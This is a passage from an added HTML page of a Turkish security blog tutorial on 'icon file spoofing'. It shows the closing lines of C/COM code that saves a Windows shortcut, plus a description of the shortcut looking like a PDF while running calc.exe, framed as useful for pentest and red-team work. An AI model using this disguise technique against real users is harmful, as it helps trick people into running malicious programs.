+</span></span><span class="line"><span class="cl"><span class="nf">CoUninitialize</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">wprintf</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;Shortcut Created!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span></code></pre></div><p>Son olarak ise Save fonksiyonu ile oluşturduğumuz kısayolu, main içerisinde oluşturduğumuz tam yoluna kaydediyoruz. Ardından IPersistFile ve IShellLink interface&rsquo;lerini serbest bırakıyoruz. CoUninitialize fonksiyonu ile COM bileşenlerini sonlandırıyoruz. Son olarak kısayolun oluşturulduğuna dair bir mesaj bastırıyoruz. <br/> <br/></p>
+<h2 id="programı-çalıştırma">Programı Çalıştırma</h2>
+<p>Programı çalıştırdığımızda ise masaüstünde kısayolumuz aşağıdaki gibi gözükecektir:</p>
+<div align="center">
+    <img src="../../img/posts/file-spoofing/img1.png" width="150">
+</div>
+<p>Kısayolumuz aslında pdf gibi gözükse de özelliklerine göz attığımızda aslında farklı bir program çalıştıracaktır:</p>
+<div align="center">
+    <img src="../../img/posts/file-spoofing/img2.png">
+</div>
+<p>Özelliklerine göz attığımızda ise aslında bu kısayolun <strong>calc.exe</strong> programını çalıştırdığını görmekteyiz.</p>
+<h2 id="sonuç">Sonuç</h2>
+<p>Bu konumda, icon file spoofing tekniğini ele aldık. Unutmayın ki bu teknik, Pentest ve Red Team çalışmalarında da kullanılışlı olabilir.</p>
+<p>Umarım faydalı olmuştur, teşekkürler! 🚀</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://medium.com/@s12deff/pdf-icon-file-spoofing-dbfd76476b82">S12 H4CK - PDF Icon File Spoofing</a></li>
+</ul>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/0xbekoo" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+<a href="https://x.com/0xbekooo" target="_blank" rel="noopener noreferrer me"
+    title="Twitter">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z">
+    </path>
+</svg>
+</a>
+<a href="https://linkedin.com/in/berkayykarakocc" target="_blank" rel="noopener noreferrer me"
+    title="Linkedin">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
+    <rect x="2" y="9" width="4" height="12"></rect>
+    <circle cx="4" cy="4" r="2"></circle>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2024 bekoo.
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+    
+        
+    
+
+    
+    
+        
+    
+
+
+
+    
+    <script async src="http://localhost:1313/js/main.js" ></script>
+
+    
+
+</body>
+</html>
